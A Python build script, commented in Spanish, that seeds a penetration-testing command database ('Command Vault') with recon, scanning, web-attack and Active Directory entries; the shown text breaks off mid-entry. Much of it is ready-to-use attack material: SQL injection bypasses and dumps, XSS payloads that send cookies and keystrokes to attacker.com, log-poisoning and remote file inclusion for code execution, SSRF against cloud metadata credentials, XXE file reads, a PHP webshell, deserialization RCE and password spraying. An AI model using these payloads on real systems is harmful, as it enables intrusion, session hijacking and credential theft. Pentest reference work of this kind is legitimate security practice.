#!/usr/bin/env python3
"""
Generador de la base de datos de comandos de Command Vault v2.0.
Se ejecuta una sola vez en build-time para producir
server/data/seed/commands-database.json

Editar este archivo es la forma recomendada de ampliar la base de datos:
añade comandos a la sección correspondiente (o crea una nueva con SECTION())
y vuelve a ejecutar `python3 build_seed.py`.
"""
import json
import os

SECTIONS = []


def SECTION(title, icon):
    s = {"title": title, "icon": icon, "commands": []}
    SECTIONS.append(s)
    return s


def CMD(section, title, description, language, command, tags, risk="info", ref=""):
    section["commands"].append({
        "title": title,
        "description": description.strip(),
        "language": language,
        "command": command.strip("\n"),
        "tags": tags,
        "risk_level": risk,
        "reference_url": ref
    })


# ════════════════════════════════════════════════════════════════
# 1. RECONOCIMIENTO Y OSINT
# ════════════════════════════════════════════════════════════════
recon = SECTION("Reconocimiento & OSINT", "radar")

CMD(recon, "Whois de dominio",
    "Consulta información de registro WHOIS de un dominio: propietario, registrador, fechas y servidores DNS.",
    "bash",
    "whois example.com",
    "recon,osint,whois,dns", "info")

CMD(recon, "Resolución DNS básica",
    "Resuelve registros A de un dominio usando dig, mostrando solo la respuesta corta.",
    "bash",
    "dig +short example.com A",
    "recon,dns,dig", "info")

CMD(recon, "Volcado completo de registros DNS",
    "Consulta todos los tipos de registros DNS habituales (A, AAAA, MX, NS, TXT, SOA) de un dominio.",
    "bash",
    """for type in A AAAA MX NS TXT SOA CNAME; do
  echo "== $type =="
  dig +short example.com $type
done""",
    "recon,dns,dig,enumeration", "info")

CMD(recon, "Transferencia de zona DNS (AXFR)",
    "Intenta una transferencia de zona DNS completa contra un servidor de nombres. Si el servidor está mal configurado, revela todos los registros del dominio.",
    "bash",
    "dig axfr example.com @ns1.example.com",
    "recon,dns,axfr,misconfig", "medium",
    "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns")

CMD(recon, "Enumeración de subdominios con Subfinder",
    "Enumera subdominios pasivamente usando múltiples fuentes OSINT (Censys, Shodan, crt.sh, etc.).",
    "bash",
    "subfinder -d example.com -all -silent -o subdomains.txt",
    "recon,subdomains,subfinder,osint", "info")

CMD(recon, "Enumeración de subdominios con Amass",
    "Enumeración pasiva y activa de subdominios con Amass, incluyendo fuentes OSINT y fuerza bruta DNS.",
    "bash",
    "amass enum -passive -d example.com -o amass_subdomains.txt",
    "recon,subdomains,amass,osint", "info")

CMD(recon, "Fuerza bruta de subdominios con ffuf",
    "Fuerza bruta de subdominios usando ffuf contra el Host header, útil cuando hay virtual hosting.",
    "bash",
    'ffuf -w subdomains.txt -u https://example.com -H "Host: FUZZ.example.com" -fs 0 -mc 200',
    "recon,subdomains,ffuf,vhost,bruteforce", "info")

CMD(recon, "Comprobar subdominios vivos con httpx",
    "Filtra una lista de subdominios y muestra solo los que responden HTTP/HTTPS, junto con título, código de estado y tecnologías.",
    "bash",
    "cat subdomains.txt | httpx -title -status-code -tech-detect -o alive.txt",
    "recon,httpx,subdomains,probing", "info")

CMD(recon, "Búsqueda de certificados en crt.sh",
    "Consulta certificate transparency logs (crt.sh) para descubrir subdominios a partir de certificados emitidos.",
    "bash",
    'curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r \'.[].name_value\' | sort -u',
    "recon,osint,certificates,crtsh", "info")

CMD(recon, "Google Dorking básico",
    "Consultas de Google Dorks habituales para descubrir archivos sensibles, paneles de login o información indexada.",
    "text",
    """site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
site:example.com ext:sql | ext:env | ext:log
site:example.com inurl:login""",
    "recon,osint,googledork,googledorking", "info")

CMD(recon, "theHarvester - correos y hosts",
    "Recolecta correos electrónicos, subdominios, IPs y empleados públicos asociados a un dominio usando múltiples motores OSINT.",
    "bash",
    "theHarvester -d example.com -b all -f harvester_results",
    "recon,osint,theharvester,emails", "info")

CMD(recon, "Shodan - búsqueda por dominio/organización",
    "Busca hosts expuestos en Shodan filtrando por nombre de dominio u organización (requiere API key configurada).",
    "bash",
    'shodan search "hostname:example.com"\nshodan search "org:\\"Example Corp\\""',
    "recon,osint,shodan", "info")

CMD(recon, "Censys - búsqueda de hosts",
    "Búsqueda de activos expuestos en Censys a partir del dominio o el nombre de la organización.",
    "bash",
    'censys search "services.tls.certificates.leaf_data.subject.common_name: example.com"',
    "recon,osint,censys", "info")

CMD(recon, "WaybackURLs - histórico de URLs",
    "Recupera URLs históricas indexadas por la Wayback Machine, útil para encontrar endpoints, parámetros y rutas olvidadas.",
    "bash",
    "echo example.com | waybackurls | sort -u > wayback_urls.txt",
    "recon,osint,waybackmachine,urls", "info")

CMD(recon, "GAU - Get All URLs",
    "Combina varias fuentes (Wayback, AlienVault OTX, Common Crawl) para extraer todas las URLs conocidas de un dominio.",
    "bash",
    "gau example.com --threads 5 | tee gau_urls.txt",
    "recon,gau,urls,osint", "info")

CMD(recon, "Búsqueda de metadatos en documentos públicos",
    "Descarga documentos públicos (PDF, DOCX) y extrae sus metadatos (autor, software, rutas internas) con exiftool.",
    "bash",
    "exiftool -a -u -g1 documento.pdf",
    "recon,osint,metadata,exiftool", "info")

CMD(recon, "Recon-ng - framework de OSINT",
    "Inicia el framework Recon-ng para automatizar la recolección OSINT (módulos de subdominios, correos, perfiles, etc.).",
    "bash",
    "recon-ng\n> workspaces create example\n> modules load recon/domains-hosts/hackertarget\n> options set SOURCE example.com\n> run",
    "recon,osint,recon-ng,framework", "info")

CMD(recon, "Identificación de tecnologías web (whatweb)",
    "Identifica el stack tecnológico de un sitio web: CMS, servidor, frameworks JS, librerías, etc.",
    "bash",
    "whatweb -v https://example.com",
    "recon,web,whatweb,fingerprint", "info")

CMD(recon, "Identificación de tecnologías con Wappalyzer CLI",
    "Detecta tecnologías usadas por un sitio web (CMS, analítica, frameworks) usando el motor de Wappalyzer en CLI.",
    "bash",
    "wappalyzer https://example.com --pretty",
    "recon,web,wappalyzer,fingerprint", "info")

CMD(recon, "Búsqueda de empleados en LinkedIn (manual)",
    "Checklist manual para reconocimiento de empleados vía LinkedIn, útil para preparar ataques de phishing dirigido o generar listas de usuarios.",
    "text",
    """1. Buscar: site:linkedin.com/in "Example Corp"
2. Identificar convención de nombres de usuario corporativo (nombre.apellido, ninicial.apellido...)
3. Cruzar con herramientas como theHarvester para validar formato de email
4. Usar CrossLinked para automatizar la extracción masiva de empleados""",
    "recon,osint,linkedin,socialengineering", "info")

CMD(recon, "CrossLinked - enumeración de empleados",
    "Automatiza la extracción de nombres de empleados desde LinkedIn vía buscadores y genera posibles direcciones de correo.",
    "bash",
    "crosslinked -f '{first}.{last}@example.com' example",
    "recon,osint,crosslinked,emails", "info")

CMD(recon, "Análisis de cabeceras HTTP",
    "Inspecciona las cabeceras de respuesta HTTP de un servidor para detectar tecnología, WAF, cookies inseguras, etc.",
    "bash",
    "curl -sI https://example.com",
    "recon,http,headers,curl", "info")

CMD(recon, "robots.txt y sitemap.xml",
    "Revisa robots.txt y sitemap.xml en busca de rutas no enlazadas públicamente que puedan ser interesantes.",
    "bash",
    "curl -s https://example.com/robots.txt\ncurl -s https://example.com/sitemap.xml",
    "recon,web,robots,sitemap", "info")


# ════════════════════════════════════════════════════════════════
# 2. ESCANEO DE RED Y PUERTOS
# ════════════════════════════════════════════════════════════════
scan = SECTION("Escaneo de Red", "scan")

CMD(scan, "Nmap - descubrimiento de hosts (ping sweep)",
    "Detecta hosts activos en un rango de red sin escanear puertos, útil para mapear rápidamente una subred.",
    "bash",
    "nmap -sn 10.10.10.0/24",
    "nmap,recon,discovery,network", "info")

CMD(scan, "Nmap - escaneo rápido de puertos comunes",
    "Escaneo rápido de los puertos TCP más comunes para una primera foto del objetivo.",
    "bash",
    "nmap -F -T4 10.10.10.10",
    "nmap,scan,ports", "info")

CMD(scan, "Nmap - escaneo completo de todos los puertos TCP",
    "Escanea los 65535 puertos TCP, ideal como paso inicial exhaustivo antes de afinar con -sV/-sC.",
    "bash",
    "nmap -p- --min-rate 5000 -T4 -oN allports.txt 10.10.10.10",
    "nmap,scan,ports,tcp", "info")

CMD(scan, "Nmap - detección de servicios y versiones",
    "Detecta versión de los servicios y aplica scripts por defecto sobre los puertos encontrados previamente.",
    "bash",
    "nmap -sC -sV -p21,22,80,443 -oN services.txt 10.10.10.10",
    "nmap,scan,version,scripts", "info")

CMD(scan, "Nmap - escaneo UDP de puertos top",
    "Escanea los puertos UDP más comunes (SNMP, DNS, NTP, etc.), suele ser más lento que TCP.",
    "bash",
    "nmap -sU --top-ports 100 -T4 10.10.10.10",
    "nmap,scan,udp", "info")

CMD(scan, "Nmap - scripts NSE de vulnerabilidades",
    "Ejecuta la categoría de scripts NSE 'vuln' para detectar vulnerabilidades conocidas en los servicios expuestos.",
    "bash",
    "nmap --script vuln -p80,443 10.10.10.10",
    "nmap,scan,vuln,nse", "medium")

CMD(scan, "Nmap - evasión de firewall/IDS",
    "Técnicas de evasión combinando fragmentación de paquetes, señuelos y temporización lenta para evitar detección.",
    "bash",
    "nmap -f -D RND:10 -T2 -p80,443 10.10.10.10",
    "nmap,scan,evasion,firewall,ids", "medium")

CMD(scan, "Nmap - exportar resultados en todos los formatos",
    "Exporta el resultado del escaneo simultáneamente en formato normal, XML y grepable para procesarlo después.",
    "bash",
    "nmap -sC -sV -oA full_scan 10.10.10.10",
    "nmap,scan,export,reporting", "info")

CMD(scan, "Masscan - escaneo masivo de puertos",
    "Escaneo ultrarrápido de todos los puertos en rangos grandes de IPs gracias a su propio motor de paquetes asíncrono.",
    "bash",
    "masscan -p1-65535 10.10.10.0/24 --rate 10000 -oG masscan_results.txt",
    "masscan,scan,ports,fast", "medium")

CMD(scan, "RustScan - escaneo rápido + nmap",
    "Combina la velocidad de RustScan para encontrar puertos abiertos con la profundidad de los scripts de Nmap.",
    "bash",
    "rustscan -a 10.10.10.10 -- -sC -sV",
    "rustscan,scan,ports,fast,nmap", "info")

CMD(scan, "Naabu - escaneo de puertos para automatización",
    "Escáner de puertos rápido pensado para pipelines de automatización en bug bounty/recon.",
    "bash",
    "naabu -host 10.10.10.10 -top-ports 1000 -o naabu_ports.txt",
    "naabu,scan,ports,automation", "info")

CMD(scan, "Detección de balanceador de carga / WAF",
    "Comprueba si el objetivo está detrás de un WAF o balanceador analizando cabeceras y comportamiento de respuesta.",
    "bash",
    "wafw00f https://example.com",
    "recon,waf,fingerprint", "info")

CMD(scan, "Banner grabbing manual con Netcat",
    "Conecta directamente a un puerto para capturar el banner del servicio expuesto.",
    "bash",
    "nc -nv 10.10.10.10 21",
    "netcat,banner,enumeration", "info")

CMD(scan, "Enumeración SNMP",
    "Vuelca información del sistema vía SNMP usando la community string por defecto 'public'.",
    "bash",
    "snmpwalk -v2c -c public 10.10.10.10",
    "snmp,enumeration,network", "low")

CMD(scan, "Identificación de sistema operativo (Nmap OS detection)",
    "Intenta determinar el sistema operativo remoto mediante fingerprinting de la pila TCP/IP.",
    "bash",
    "nmap -O --osscan-guess 10.10.10.10",
    "nmap,os,fingerprint", "info")


# ════════════════════════════════════════════════════════════════
# 3. WEB HACKING - ENUMERACIÓN Y FUZZING
# ════════════════════════════════════════════════════════════════
webfuzz = SECTION("Web - Enumeración & Fuzzing", "globe")

CMD(webfuzz, "Gobuster - fuzzing de directorios",
    "Fuerza bruta de directorios y archivos en un servidor web usando una wordlist, filtrando por código de estado y extensiones comunes.",
    "bash",
    'gobuster dir -u "http://example.com" -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -k',
    "web,gobuster,fuzzing,enumeration", "info")

CMD(webfuzz, "Gobuster - fuerza bruta de subdominios DNS",
    "Enumera subdominios mediante resolución DNS directa contra una wordlist.",
    "bash",
    "gobuster dns -d example.com -w /usr/share/wordlists/subdomains-top1million.txt -t 50",
    "web,gobuster,dns,subdomains", "info")

CMD(webfuzz, "FFUF - fuzzing de parámetros GET",
    "Fuerza bruta de nombres de parámetros GET para descubrir parámetros ocultos no documentados.",
    "bash",
    'ffuf -u "http://example.com/page.php?FUZZ=test" -w params.txt -fs 0 -mc 200',
    "web,ffuf,fuzzing,parameters", "info")

CMD(webfuzz, "FFUF - fuzzing de directorios con filtrado por tamaño",
    "Fuzzing de rutas filtrando respuestas por tamaño para eliminar falsos positivos de páginas 'catch-all'.",
    "bash",
    'ffuf -u "http://example.com/FUZZ" -w /usr/share/wordlists/dirb/big.txt -fs 4242 -t 80',
    "web,ffuf,fuzzing,directories", "info")

CMD(webfuzz, "FFUF - fuzzing recursivo de directorios",
    "Fuzzing recursivo automático que entra en cada directorio descubierto repitiendo el ataque.",
    "bash",
    'ffuf -u "http://example.com/FUZZ" -w wordlist.txt -recursion -recursion-depth 2 -t 60 -mc 200,301,302,403',
    "web,ffuf,fuzzing,recursive", "info")

CMD(webfuzz, "Dirsearch - fuzzing de rutas con extensiones",
    "Escaneo de rutas web con detección de extensiones de archivo y reporte exportable.",
    "bash",
    "dirsearch -u http://example.com -e php,asp,aspx,jsp,html,zip,bak -x 404 --format=json -o dirsearch.json",
    "web,dirsearch,fuzzing,enumeration", "info")

CMD(webfuzz, "Feroxbuster - fuzzing recursivo rápido",
    "Fuzzing recursivo de directorios escrito en Rust, rápido y con detección automática de wildcard responses.",
    "bash",
    "feroxbuster -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 100",
    "web,feroxbuster,fuzzing,recursive", "info")

CMD(webfuzz, "Nikto - escáner de vulnerabilidades web",
    "Escáner automático que busca configuraciones inseguras, archivos peligrosos, versiones desactualizadas y problemas comunes en servidores web.",
    "bash",
    "nikto -h http://example.com -o nikto_report.html -Format html",
    "web,nikto,vulnscan", "medium")

CMD(webfuzz, "WPScan - auditoría de WordPress",
    "Enumera plugins, temas, usuarios vulnerables de un sitio WordPress y los compara con la base de datos de vulnerabilidades de WPScan.",
    "bash",
    "wpscan --url http://example.com --enumerate vp,vt,u --api-token <API_TOKEN>",
    "web,wpscan,wordpress,cms", "medium",
    "https://wpscan.com/")

CMD(webfuzz, "Joomscan - auditoría de Joomla",
    "Escanea instalaciones de Joomla en busca de versión, componentes vulnerables y configuraciones inseguras.",
    "bash",
    "joomscan --url http://example.com",
    "web,joomscan,joomla,cms", "info")

CMD(webfuzz, "Droopescan - auditoría de Drupal",
    "Identifica versión y plugins vulnerables en instalaciones Drupal, Joomla o SilverStripe.",
    "bash",
    "droopescan scan drupal -u http://example.com",
    "web,droopescan,drupal,cms", "info")

CMD(webfuzz, "Burp Suite - configuración de proxy (curl)",
    "Redirige tráfico de curl a través de Burp Suite para interceptar y analizar peticiones manualmente.",
    "bash",
    'curl -x http://127.0.0.1:8080 -k https://example.com',
    "web,burpsuite,proxy,intercept", "info")

CMD(webfuzz, "Detección de virtual hosting",
    "Comprueba si un servidor aloja múltiples sitios distintos mediante el header Host, revelando aplicaciones ocultas.",
    "bash",
    'ffuf -w subdomains.txt -u http://10.10.10.10 -H "Host: FUZZ.example.com" -fs 612',
    "web,vhost,fuzzing,enumeration", "info")

CMD(webfuzz, "Extracción de formularios y endpoints con LinkFinder",
    "Extrae endpoints y rutas internas embebidas en archivos JavaScript de la aplicación.",
    "bash",
    "python3 linkfinder.py -i https://example.com/app.js -o cli",
    "web,linkfinder,javascript,endpoints", "info")

CMD(webfuzz, "Arjun - descubrimiento de parámetros HTTP",
    "Descubre parámetros HTTP ocultos (GET/POST/JSON) probando contra una wordlist masiva de nombres comunes.",
    "bash",
    "arjun -u https://example.com/api/endpoint -m GET",
    "web,arjun,parameters,fuzzing", "info")

CMD(webfuzz, "Identificación de tecnología y CMS (CMSeeK)",
    "Detecta automáticamente qué CMS utiliza un sitio web y extrae información de versión y plugins.",
    "bash",
    "cmseek -u https://example.com",
    "web,cmseek,cms,fingerprint", "info")


# ════════════════════════════════════════════════════════════════
# 4. WEB HACKING - INYECCIÓN SQL
# ════════════════════════════════════════════════════════════════
sqli = SECTION("Web - SQL Injection", "database")

CMD(sqli, "SQLi - bypass de autenticación clásico",
    "Payloads clásicos para intentar saltarse un formulario de login vulnerable a inyección SQL.",
    "sql",
    """' OR 1=1-- -
' OR '1'='1
' OR '1'='1' -- -
admin' -- -
admin' #
' OR 1=1#""",
    "sqli,web,authbypass,injection", "high",
    "https://owasp.org/www-community/attacks/SQL_Injection")

CMD(sqli, "SQLi - detección con comilla simple",
    "Payload mínimo para confirmar si un parámetro es vulnerable a inyección SQL provocando un error de sintaxis.",
    "sql",
    "'",
    "sqli,web,detection,injection", "low")

CMD(sqli, "SQLi - UNION based, descubrir número de columnas",
    "Determina el número de columnas de la consulta original usando ORDER BY incremental antes de un ataque UNION.",
    "sql",
    """' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
-- Continuar incrementando hasta provocar un error""",
    "sqli,web,union,injection", "medium")

CMD(sqli, "SQLi - UNION based, extracción de datos",
    "Una vez determinado el número de columnas, extrae datos de otras tablas combinando con UNION SELECT.",
    "sql",
    "' UNION SELECT username, password, NULL FROM users-- -",
    "sqli,web,union,injection,extraction", "high")

CMD(sqli, "SQLi - extracción de metadatos MySQL",
    "Consulta el esquema de información de MySQL para listar bases de datos, tablas y columnas accesibles.",
    "sql",
    """' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -""",
    "sqli,web,mysql,enumeration", "high")

CMD(sqli, "SQLi - blind boolean based",
    "Payloads para inyección ciega basada en booleanos: se observa si la respuesta cambia entre condición verdadera y falsa.",
    "sql",
    """' AND 1=1-- -   (verdadero, respuesta normal)
' AND 1=2-- -   (falso, respuesta distinta)
' AND SUBSTRING(database(),1,1)='a'-- -""",
    "sqli,web,blind,boolean", "high")

CMD(sqli, "SQLi - blind time based",
    "Inyección ciega basada en tiempo: provoca un retardo en la respuesta para confirmar la vulnerabilidad sin ver output directo.",
    "sql",
    """' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -   (MSSQL)
' AND pg_sleep(5)-- -          (PostgreSQL)""",
    "sqli,web,blind,timebased", "high")

CMD(sqli, "SQLi - error based MySQL (extractvalue)",
    "Provoca un error de XML manipulado para filtrar datos directamente en el mensaje de error mostrado por la app.",
    "sql",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    "sqli,web,errorbased,mysql", "high")

CMD(sqli, "SQLMap - escaneo automático básico",
    "Lanza SQLMap contra una URL con parámetro vulnerable, detectando y explotando automáticamente la inyección.",
    "bash",
    "sqlmap -u \"http://example.com/item.php?id=1\" --batch --level=3 --risk=2",
    "sqli,sqlmap,automation,injection", "high",
    "https://github.com/sqlmapproject/sqlmap")

CMD(sqli, "SQLMap - extracción de bases de datos",
    "Una vez confirmada la inyección, enumera las bases de datos disponibles en el servidor.",
    "bash",
    "sqlmap -u \"http://example.com/item.php?id=1\" --batch --dbs",
    "sqli,sqlmap,enumeration,extraction", "high")

CMD(sqli, "SQLMap - dump de tabla específica",
    "Extrae todo el contenido de una tabla concreta una vez identificada la base de datos.",
    "bash",
    "sqlmap -u \"http://example.com/item.php?id=1\" --batch -D appdb -T users --dump",
    "sqli,sqlmap,extraction,dump", "critical")

CMD(sqli, "SQLMap - usando cookie de sesión autenticada",
    "Realiza la inyección autenticado, pasando la cookie de sesión capturada previamente.",
    "bash",
    'sqlmap -u "http://example.com/profile.php?id=1" --batch --cookie="PHPSESSID=abc123" --dbs',
    "sqli,sqlmap,authenticated,session", "high")

CMD(sqli, "SQLMap - inyección vía POST con request file",
    "Reutiliza una petición HTTP capturada en Burp (formato .req) para que SQLMap pruebe todos los parámetros del cuerpo.",
    "bash",
    "sqlmap -r request.txt --batch --level=5 --risk=3 -p username",
    "sqli,sqlmap,post,burp", "high")

CMD(sqli, "SQLMap - obtener shell del sistema operativo",
    "Si el DBMS lo permite (por ejemplo MySQL con privilegios FILE), intenta obtener ejecución de comandos en el SO.",
    "bash",
    "sqlmap -u \"http://example.com/item.php?id=1\" --batch --os-shell",
    "sqli,sqlmap,rce,osshell", "critical")

CMD(sqli, "NoSQLi - bypass de autenticación MongoDB",
    "Payloads de operadores MongoDB para intentar saltarse autenticación en aplicaciones que usan NoSQL sin sanitizar.",
    "json",
    """{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.password.length > 0"}""",
    "nosqli,mongodb,web,authbypass", "high")


# ════════════════════════════════════════════════════════════════
# 5. WEB HACKING - XSS Y CLIENT SIDE
# ════════════════════════════════════════════════════════════════
xss = SECTION("Web - XSS & Client-Side", "code")

CMD(xss, "XSS - payload básico de alerta",
    "Payload mínimo para confirmar la existencia de un XSS reflejado o almacenado.",
    "html",
    "<script>alert(document.domain)</script>",
    "xss,web,injection,clientside", "medium",
    "https://owasp.org/www-community/attacks/xss/")

CMD(xss, "XSS - bypass de filtros con eventos HTML",
    "Payloads alternativos que evitan filtros básicos de la etiqueta <script> usando atributos de evento.",
    "html",
    """<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src=javascript:alert(document.domain)>""",
    "xss,web,bypass,filterevasion", "medium")

CMD(xss, "XSS - robo de cookies de sesión",
    "Payload que exfiltra la cookie de la víctima hacia un servidor controlado por el atacante.",
    "html",
    "<script>fetch('https://attacker.com/log?c='+document.cookie)</script>",
    "xss,web,cookietheft,sessionhijacking", "high")

CMD(xss, "XSS - keylogger básico para PoC",
    "Payload de prueba de concepto que captura pulsaciones de teclado y las envía al atacante.",
    "html",
    """<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?k=' + e.key);
}
</script>""",
    "xss,web,keylogger,poc", "high")

CMD(xss, "XSS - DOM based con location.hash",
    "Demuestra un XSS basado en DOM que se ejecuta al manipular código JS que procesa el fragmento de la URL sin sanitizar.",
    "javascript",
    """// Código vulnerable de ejemplo:
document.getElementById('output').innerHTML = location.hash.substring(1);

// URL maliciosa:
// https://example.com/page#<img src=x onerror=alert(1)>""",
    "xss,web,dom,clientside", "medium")

CMD(xss, "Dalfox - escaneo automático de XSS",
    "Herramienta que automatiza la detección de XSS reflejado, almacenado y basado en DOM sobre una lista de URLs.",
    "bash",
    "dalfox url https://example.com/search?q=test",
    "xss,dalfox,automation,scanning", "medium")

CMD(xss, "XSStrike - escáner avanzado de XSS",
    "Motor de fuzzing avanzado para XSS que analiza el contexto de inyección y genera payloads adaptados.",
    "bash",
    "python3 xsstrike.py -u \"https://example.com/search?q=test\"",
    "xss,xsstrike,automation,fuzzing", "medium")

CMD(xss, "CSP bypass - detección de política débil",
    "Inspecciona la cabecera Content-Security-Policy en busca de configuraciones permisivas que permitan bypass de XSS.",
    "bash",
    'curl -sI https://example.com | grep -i "content-security-policy"',
    "xss,csp,bypass,headers", "info")

CMD(xss, "CSRF - PoC de formulario automático",
    "Plantilla de página HTML que envía automáticamente una petición CSRF al cargarse, útil para demostrar el impacto.",
    "html",
    """<html>
  <body onload="document.forms[0].submit()">
    <form action="https://example.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
  </body>
</html>""",
    "csrf,web,poc,forgery", "medium",
    "https://owasp.org/www-community/attacks/csrf")

CMD(xss, "Open Redirect - payloads comunes",
    "Patrones de payload para detectar y explotar vulnerabilidades de redirección abierta en parámetros de URL.",
    "text",
    """https://example.com/redirect?url=https://evil.com
https://example.com/redirect?url=//evil.com
https://example.com/redirect?url=https:evil.com
https://example.com/redirect?next=/\\evil.com""",
    "openredirect,web,injection", "low")


# ════════════════════════════════════════════════════════════════
# 6. WEB HACKING - LFI / RFI / SSRF / XXE / DESERIALIZACIÓN
# ════════════════════════════════════════════════════════════════
fileinj = SECTION("Web - LFI/RFI/SSRF/XXE", "file")

CMD(fileinj, "LFI - path traversal básico",
    "Payloads de traversal de directorios para intentar leer archivos sensibles del sistema vía Local File Inclusion.",
    "text",
    """../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
/etc/passwd%00""",
    "lfi,web,pathtraversal,injection", "high",
    "https://owasp.org/www-community/attacks/Path_Traversal")

CMD(fileinj, "LFI - lectura de logs para RCE (log poisoning)",
    "Técnica de envenenamiento de logs: se inyecta PHP en el User-Agent y luego se incluye el log vía LFI para lograr RCE.",
    "bash",
    '''curl -A "<?php system($_GET['cmd']); ?>" http://example.com/
curl "http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id"''',
    "lfi,web,rce,logpoisoning", "critical")

CMD(fileinj, "LFI - PHP filter wrapper para leer código fuente",
    "Usa el wrapper php://filter con codificación base64 para leer el código fuente PHP sin que se ejecute.",
    "text",
    "php://filter/convert.base64-encode/resource=index.php",
    "lfi,web,phpfilter,sourcedisclosure", "medium")

CMD(fileinj, "RFI - inclusión remota de archivo",
    "Intenta incluir un archivo PHP malicioso alojado en un servidor externo controlado por el atacante.",
    "bash",
    "curl \"http://example.com/index.php?page=http://attacker.com/shell.txt\"",
    "rfi,web,rce,injection", "critical")

CMD(fileinj, "SSRF - payloads básicos contra metadatos cloud",
    "Payloads SSRF habituales para intentar acceder a servicios internos o endpoints de metadatos de instancias cloud (AWS/GCP/Azure).",
    "text",
    """http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://127.0.0.1:80/admin
http://localhost:6379/  (Redis interno)""",
    "ssrf,web,cloud,metadata", "critical",
    "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery")

CMD(fileinj, "SSRF - bypass de filtros de IP",
    "Técnicas de codificación y representación alternativa de IPs para evadir filtros simples de SSRF.",
    "text",
    """http://0177.0.0.1/        (octal)
http://2130706433/        (decimal)
http://0x7f000001/        (hexadecimal)
http://127.1/
http://[::ffff:127.0.0.1]/""",
    "ssrf,web,bypass,filterevasion", "high")

CMD(fileinj, "XXE - lectura de archivos locales",
    "Payload XML External Entity para leer archivos del sistema explotando un parser XML mal configurado.",
    "xml",
    """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>""",
    "xxe,web,xml,fileread", "high",
    "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing")

CMD(fileinj, "XXE - SSRF vía entidad externa",
    "Usa una entidad externa para forzar al servidor a realizar una petición HTTP hacia un host controlado o interno.",
    "xml",
    """<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/ssrf"> ]>
<root>&xxe;</root>""",
    "xxe,ssrf,web,xml", "high")

CMD(fileinj, "Deserialización insegura PHP - PoC genérico",
    "Plantilla de clase PHP con método mágico __wakeup/__destruct usada como base para cadenas de deserialización (gadget chains).",
    "php",
    """<?php
class Exploit {
    public $cmd = 'id';
    function __destruct() {
        system($this->cmd);
    }
}
echo urlencode(serialize(new Exploit()));
?>""",
    "deserialization,php,rce,web", "critical")

CMD(fileinj, "ysoserial - deserialización insegura en Java",
    "Genera payloads de deserialización Java para distintos gadget chains conocidos (CommonsCollections, Spring, etc.).",
    "bash",
    "java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin",
    "deserialization,java,ysoserial,rce", "critical",
    "https://github.com/frohoff/ysoserial")

CMD(fileinj, "Command Injection - payloads básicos",
    "Operadores de encadenamiento de comandos habituales para intentar inyectar comandos del sistema operativo.",
    "text",
    """; id
| id
|| id
&& id
$(id)
`id`""",
    "commandinjection,web,rce,injection", "critical",
    "https://owasp.org/www-community/attacks/Command_Injection")

CMD(fileinj, "Command Injection - bypass de filtros de espacios",
    "Técnicas para evadir filtros que bloquean el carácter de espacio en payloads de inyección de comandos.",
    "bash",
    """cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd""",
    "commandinjection,web,bypass,filterevasion", "high")

CMD(fileinj, "Subida de archivos maliciosos - webshell PHP",
    "Webshell PHP mínima para pruebas de concepto en endpoints de subida de archivos sin validación adecuada.",
    "php",
    "<?php system($_GET['cmd']); ?>",
    "fileupload,webshell,php,rce", "critical")

CMD(fileinj, "Bypass de validación de extensión en subida de archivos",
    "Variantes de nombre de archivo para intentar evadir filtros de extensión en formularios de subida.",
    "text",
    """shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.phtml
shell.php5
shell.php;.jpg""",
    "fileupload,bypass,web,filterevasion", "high")


# ════════════════════════════════════════════════════════════════
# 7. ACTIVE DIRECTORY
# ════════════════════════════════════════════════════════════════
ad = SECTION("Active Directory", "windows")

CMD(ad, "Enumeración no autenticada con NetExec (CME)",
    "Comprueba qué hosts responden SMB y recopila información básica (OS, dominio, firma SMB) sin credenciales.",
    "bash",
    "netexec smb 10.10.10.0/24",
    "ad,netexec,crackmapexec,smb,enumeration", "info")

CMD(ad, "Validar credenciales contra el dominio (NetExec)",
    "Comprueba si un usuario/contraseña es válido contra todos los hosts del rango, marcando administradores locales (Pwn3d!).",
    "bash",
    "netexec smb 10.10.10.0/24 -u jdoe -p 'Password123!' -d corp.local",
    "ad,netexec,crackmapexec,authentication", "medium")

CMD(ad, "Password spraying contra Active Directory",
    "Prueba una única contraseña común contra una lista de usuarios para evitar bloqueos por intentos fallidos (lockout).",
    "bash",
    "netexec smb 10.10.10.10 -u users.txt -p 'Winter2026!' -d corp.local --continue-on-success",
    "ad,passwordspray,bruteforce,netexec", "high")

CMD(ad, "Enumeración de usuarios vía RID brute-force",
    "Enumera usuarios y grupos del dominio aprovechando RIDs secuenciales vía sesión nula o autenticada.",
    "bash",
    "netexec smb 10.10.10.10 -u '' -p '' --rid-brute",
    "ad,rid,enumeration,users", "info")

CMD(ad, "Kerbrute - enumeración de usuarios vía Kerberos",
